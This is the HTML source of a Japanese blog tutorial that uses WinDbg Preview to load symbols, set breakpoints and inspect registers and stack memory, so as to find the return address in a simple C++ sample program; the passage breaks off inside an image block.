&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;cpp&quot;&gt;&lt;pre class=&quot;language-cpp&quot;&gt;&lt;code class=&quot;language-cpp&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// return_addr.cpp&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;stdio.h&gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;ret_func&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Call ret_func\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Start main\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;ret_func&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Return ret_func\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;サンプルコードについては、&lt;a href=&quot;https://github.com/kash1064/Try2WinDbg&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;kash1064/Try2WinDbg&lt;/a&gt;に置いてあります。&lt;/p&gt;
&lt;p&gt;サンプルプログラムをシンボルファイル(（.pdb）付きでコンパイルする方法については、以下の記事でまとめているので良ければご参照ください。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;/windows-windbg-006-symbol&quot;&gt;llvm-mingwを使ってLinux環境でもシンボルファイル（.pdb）を作成する方法&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;それでは、このソースコードをコンパイルした&lt;code class=&quot;language-text&quot;&gt;return_addr.exe&lt;/code&gt;を使用して、さっそく解析を行っていきます。&lt;/p&gt;
&lt;h2 id=&quot;windbgでアプリケーションを起動する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#windbg%E3%81%A7%E3%82%A2%E3%83%97%E3%83%AA%E3%82%B1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%82%92%E8%B5%B7%E5%8B%95%E3%81%99%E3%82%8B&quot; aria-label=&quot;windbgでアプリケーションを起動する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;WinDbgでアプリケーションを起動する&lt;/h2&gt;
&lt;p&gt;今回はUWP版のWinDbg Previewを使用して解析を行います。
Windowsストアからダウンロードできます。&lt;/p&gt;
&lt;p&gt;まずは、コンパイルした&lt;code class=&quot;language-text&quot;&gt;return_addr.exe&lt;/code&gt;をWinDbgから実行します。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/8f30de1343e57c5f98ceb1fe263c893d/0b533/image-39.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 55.00000000000001%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAARlAAAEZQAGA43XUAAACM0lEQVQoz5WSS28SURiGJ+qGQiqX2gXlfhPBdBQEBk0lKQsv3fgvCLeNsbiQiImbbizwAxrX/Aa7NsaFMcbYFBhgZijQaaEQoGFTXuecGi+JGj3Jk+9cvnnP+31nGEkUIApNSEILDb6Gk0Ef8/kZyJjP8V9jNpuB2W/J2GsegpcGaPXG2OO72Nl5je3tVyiXy5RSqUQpFovf579SxtbWFnZ334D5Igzw/nML7z7y+FSX8fZDFZ6rXuh1l7G8vITFxUXodDpoNBqoVCrKwsICjWq1mu5fWVrChYuX8PhJDszxkQyx1YTQbCjlHqPV5BFdi8Fms2GVZREOh8EqkRAKhRCNRhEMBhGJRBAIBCjXvF4YV8x4/uIlmCP5AIIootPpYHp6inq9Di5+X0lYAXszgAcPN6gA+ZDjoojH4+AU0VgsRi/jOA4ulwtarRb5/DMw8uEBOt0uer0eToZDVKtV3F6/B4fLDY/HQ52aTCaK2WyGxWKhkUD2yNrpdEKv1yuCeTBCo44DxV273YYsy6jVarizdhdWmxVepRSr1UpF/4bD4fghWG/wSrnnDieTCXieR0TpIXHn9/v/SZA4NBgM54L7UgeiJEIQBIzHY9rD9Y1HuL7K0maTkojonyDndrud/glUcNDvo/+N6XRKHQaDt2A0GuHz+SjErdvt/i3knGVv0PxCoQBmNBqBMFQehDiUJAm5zU0kEglkMhlks1mk02mkUikafyaZTCKXe0qdkbxKpYKvCaUEELLRkZkAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/8f30de1343e57c5f98ceb1fe263c893d/8ac56/image-39.webp 240w,
/static/8f30de1343e57c5f98ceb1fe263c893d/d3be9/image-39.webp 480w,
/static/8f30de1343e57c5f98ceb1fe263c893d/b0a15/image-39.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/8f30de1343e57c5f98ceb1fe263c893d/8ff5a/image-39.png 240w,
/static/8f30de1343e57c5f98ceb1fe263c893d/e85cb/image-39.png 480w,
/static/8f30de1343e57c5f98ceb1fe263c893d/0b533/image-39.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/8f30de1343e57c5f98ceb1fe263c893d/0b533/image-39.png&quot;
            alt=&quot;image-39.png&quot;
            title=&quot;image-39.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;すると、起動前の状態で停止し、デバッグコマンドか使用できるようになります。&lt;/p&gt;
&lt;p&gt;まずはシンボルファイルを読み込ませていきます。&lt;/p&gt;
&lt;p&gt;僕の環境では、デスクトップに&lt;code class=&quot;language-text&quot;&gt;return_addr.pdb&lt;/code&gt;を配置しているため、&lt;code class=&quot;language-text&quot;&gt;.sympath+ &amp;lt;デスクトップのパス&gt;&lt;/code&gt;としてます。
シンボルファイルのパスを追加した後は&lt;code class=&quot;language-text&quot;&gt;.reload&lt;/code&gt;コマンドを実行します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;sympath+ C:\Users\Tadpole01\Desktop
&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;reload&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;シンボルファイルが適切に読み込まれている場合、以下の画像のように&lt;code class=&quot;language-text&quot;&gt;ttd_tutorial.exe&lt;/code&gt;の関数名などをWinDbgが解釈して表示することができるようになります。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;㏐&lt;/code&gt;コマンドでモジュール一覧を表示した際に、以下のように&lt;code class=&quot;language-text&quot;&gt;(pdb symbols)&lt;/code&gt;と表示されていればOKです。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;0:000&gt; lm
&lt;span class=&quot;token function&quot;&gt;start&lt;/span&gt;             &lt;span class=&quot;token keyword&quot;&gt;end&lt;/span&gt;                 module name
00007ff7`cd710000 00007ff7`cd72a000   return_addr C &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pdb symbols&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;          C:\ProgramData\Dbg\sym\return_addr&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pdb\28CEC53415E7CD7D4C4C44205044422E1\return_addr&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pdb
00007ffd`ef320000 00007ffd`ef5e9000   KERNELBASE   &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;deferred&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;             
00007ffd`ef5f0000 00007ffd`ef6f0000   ucrtbase   &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;deferred&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;             
00007ffd`f01b0000 00007ffd`f026e000   KERNEL32   &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;deferred&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;             
00007ffd`f18d0000 00007ffd`f1ac5000   ntdll      &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pdb symbols&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;          C:\ProgramData\Dbg\sym\ntdll&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pdb\96EF4ED537402DAAA51D4A4212EA4B2C1\ntdll&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pdb&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;main-関数のアドレスにブレークポイントを設定する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#main-%E9%96%A2%E6%95%B0%E3%81%AE%E3%82%A2%E3%83%89%E3%83%AC%E3%82%B9%E3%81%AB%E3%83%96%E3%83%AC%E3%83%BC%E3%82%AF%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88%E3%82%92%E8%A8%AD%E5%AE%9A%E3%81%99%E3%82%8B&quot; aria-label=&quot;main 関数のアドレスにブレークポイントを設定する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;main 関数のアドレスにブレークポイントを設定する&lt;/h2&gt;
&lt;p&gt;プログラムのデバッグのためにブレークポイントを設定したいので、まずはmain関数のアドレスを特定していきます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;x /D /f return_addr!m*&lt;/code&gt;を実行すると、mから始まるシンボルの一覧が表示されます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;0:000&gt; x &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;D &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;f return_addr!m*
 A B C D E F G H I J K L M N O P Q R S T U V W X Y Z

00007ff6`96451490 return_addr!main &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;main&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
00007ff6`964527b0 return_addr!memcpy &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;memcpy&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
00007ff6`96452790 return_addr!malloc &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;malloc&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
00007ff6`96451420 return_addr!mainCRTStartup &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;mainCRTStartup&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
00007ff6`964516a0 return_addr!matherr &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;_matherr&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;main関数は&lt;code class=&quot;language-text&quot;&gt;00007ff7 cd711490&lt;/code&gt;にあることがわかりました。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;bu&lt;/code&gt;コマンドでブレークポイントを設定し、&lt;code class=&quot;language-text&quot;&gt;bl&lt;/code&gt;コマンドで設定されたことを確認します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;0:000&gt; bu 00007ff7`cd711490
0:000&gt; bl
     1 e Disable Clear  00007ff7`cd711490     0001 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;0001&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;  0:&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; return_addr!main&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;g&lt;/code&gt;コマンドでプログラムを実行したところ、main関数の開始時点で停止するところまで進めることができました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/3d5add2849ffd712de4c9b1b90999cec/0b533/image-40.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 44.99999999999999%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAARlAAAEZQAGA43XUAAABwElEQVQoz3WS2a6bMBRF+f9f6W9UqtSXVrlqEsKUQIBg5sHMZPVAVfWhupa2bGR7s473Mb58tfl28rCdANuLiV4FSZrzEiVZQRQrfD+gKiumaaJre9qmRetevuf/ZDw9F9eyud1s7p5Pmma0bYPuOvpeUxQFpnlFqYR99P3Ctm18NoyHr7jfEx4PRRSV5Hkrhi2NqBPTPC+wLIebaVPXrRhCXQmdXhnbhUHPjOPM338YHx8nLpcPzudfQmmSJIlQlXK5pm4aIU6xbj9xnZOUG9HWKXUZsgwFLA2sNbxFW81bZHhSpm0nhGFElqVClFNKmftcVRXZbmj+4Hr+LmsH3cp+7KNVxFJkzDplnjK2pRTTCsNxfDyv4fVS8k7qINrnMAyPdZIoXPd+vLGSoHQH1bOjew7oYKRLBzo9sCzvPyVfrxeez4cYvojjmCAIyIVwXVc5tFBKujfTPOj30bUT0zx/Eskbw3UcbMvCvJxxHFta5CEmJdu6HEf2tE0xdF33CGscNoZBiMR0nv5pb6kdwIiiFyqTEKS/yrpDDzPDtNJ0I8O8kcqe67h4Yri/bVn2qFCCURVjI7S1SKjHcTpMfwPouqnJpSj4BwAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/3d5add2849ffd712de4c9b1b90999cec/8ac56/image-40.webp 240w,
/static/3d5add2849ffd712de4c9b1b90999cec/d3be9/image-40.webp 480w,
/static/3d5add2849ffd712de4c9b1b90999cec/b0a15/image-40.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/3d5add2849ffd712de4c9b1b90999cec/8ff5a/image-40.png 240w,
/static/3d5add2849ffd712de4c9b1b90999cec/e85cb/image-40.png 480w,
/static/3d5add2849ffd712de4c9b1b90999cec/0b533/image-40.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/3d5add2849ffd712de4c9b1b90999cec/0b533/image-40.png&quot;
            alt=&quot;image-40.png&quot;
            title=&quot;image-40.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;return_addr関数にブレークポイントを設定する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#return_addr%E9%96%A2%E6%95%B0%E3%81%AB%E3%83%96%E3%83%AC%E3%83%BC%E3%82%AF%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88%E3%82%92%E8%A8%AD%E5%AE%9A%E3%81%99%E3%82%8B&quot; aria-label=&quot;return_addr関数にブレークポイントを設定する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;return_addr関数にブレークポイントを設定する&lt;/h2&gt;
&lt;p&gt;今回は、関数呼び出し時のベースポインタに格納される値を確認することを目的にしています。&lt;/p&gt;
&lt;p&gt;そのため、次はDisassemblyウインドウで確認した&lt;code class=&quot;language-text&quot;&gt;ret_func&lt;/code&gt;関数の先頭アドレスにブレークポイントを設定します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;0:000&gt; bu 00007ff6`96451470
0:000&gt; bl
     0 e Disable Clear  00007ff6`96451470     0001 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;0001&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;  0:&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; return_addr!Z8ret_funcv
     1 e Disable Clear  00007ff6`96451490     0001 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;0001&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;  0:&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; return_addr!main&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;g&lt;/code&gt;コマンドで実行したところで、&lt;code class=&quot;language-text&quot;&gt;r&lt;/code&gt;コマンドを使ってレジスタ情報を出力します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;0:000&gt; g
Breakpoint 0 hit
return_addr!Z8ret_funcv:
00007ff6`96451470 4883ec28        sub     rsp&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;28h

0:000&gt; r
rax=000000000000000b rbx=0000000000000001 rcx=00000000ffffffff
rdx=00007ffdef6e0980 rsi=0000021d4c3134d0 rdi=000000000000002b
rip=00007ff696451470 rsp=0000002e738ff748 &lt;span class=&quot;token function&quot;&gt;rbp&lt;/span&gt;=0000002e738ff780
 r8=0000002e738fdb78  r9=0000021d4c31a47b r10=0000000000000000
r11=0000002e738ff660 r12=0000000000000000 r13=0000000000000000
r14=0000021d4c315230 r15=0000000000000001
iopl=0         &lt;span class=&quot;token function&quot;&gt;nv&lt;/span&gt; up ei pl nz na pe nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
return_addr!Z8ret_funcv:
00007ff6`96451470 4883ec28        sub     rsp&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;28h&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;関数呼び出し直後の&lt;code class=&quot;language-text&quot;&gt;rbp&lt;/code&gt;レジスタの値は&lt;code class=&quot;language-text&quot;&gt;0x2e738ff780&lt;/code&gt;であることがわかりました。&lt;/p&gt;
&lt;h2 id=&quot;メモリの情報を参照する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%A1%E3%83%A2%E3%83%AA%E3%81%AE%E6%83%85%E5%A0%B1%E3%82%92%E5%8F%82%E7%85%A7%E3%81%99%E3%82%8B&quot; aria-label=&quot;メモリの情報を参照する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;メモリの情報を参照する&lt;/h2&gt;
&lt;p&gt;次に、Memoryウインドウのアドレスバーに&lt;code class=&quot;language-text&quot;&gt;rbp&lt;/code&gt;レジスタの指すアドレスを入力し、メモリの情報を確認します。&lt;/p&gt;
&lt;p&gt;どうやら、&lt;code class=&quot;language-text&quot;&gt;0x7FF6964513DA&lt;/code&gt;という値が格納されているようです。（リトルエンディアン表記なので逆から読みます。）&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 554px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/1cabcf6604be115fac70bf2636e0bf95/04abd/image-41.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 43.75%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAABxElEQVQoz4WR227TUBBF/ZfwEMoP8FXwALS0FImXEtFULUkaJ67tXJo0vh1fjh07tFVVhFRouxgnEeIBhKWlPT6zZ86Mbez3Y3YHmp2+5l0/F83Y7qf/x/yTTY2o8WI/pvE65Okrjycv5zTehDS2Axpv/84zyW3thGxtK9FINNrEIc9Fje8319zdXvPtquT2soT7O+Dnhvu1Pm54+CHvD/z7ecRwXYe80ASBT7WsWH5dUhQFVVVRlguSJBEUl8uFUHJztWSRp+gkIlYhi7KgrEqpq/ADmfBzq4NpjWh3LSx7ypk748yZYjkzYYo5kFzP5aB3wSfTo9n3+die8OF4RLPtSs1kVWMPL+j1xxjNwzY9KTrpWNJ4Qtd0aZ/aa7o2nZ7Dcdfh/ZHD3pHLbstlr1XHQw5OHLo9my+nzsp32DIxbNsi1ymz2TlFrkmTmDD0iaLgN/VqeaqEiCyOyGVdHcu5+JTaeOR85MqEA8sijELG4xFJmkkywvN8fH9NHYehNMo0mdbiSVcaRor5fL769p74giDAHZ5jjKRRnudS7KF1TiZNlVKoWMlk8Yr6x2RZRirNaq+uN0kTlFwex7F4157p1OMXnoZz0M48/4oAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/1cabcf6604be115fac70bf2636e0bf95/8ac56/image-41.webp 240w,
/static/1cabcf6604be115fac70bf2636e0bf95/d3be9/image-41.webp 480w,
/static/1cabcf6604be115fac70bf2636e0bf95/5e3e0/image-41.webp 554w&quot;
              sizes=&quot;(max-width: 554px) 100vw, 554px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/1cabcf6604be115fac70bf2636e0bf95/8ff5a/image-41.png 240w,
/static/1cabcf6604be115fac70bf2636e0bf95/e85cb/image-41.png 480w,
/static/1cabcf6604be115fac70bf2636e0bf95/04abd/image-41.png 554w&quot;
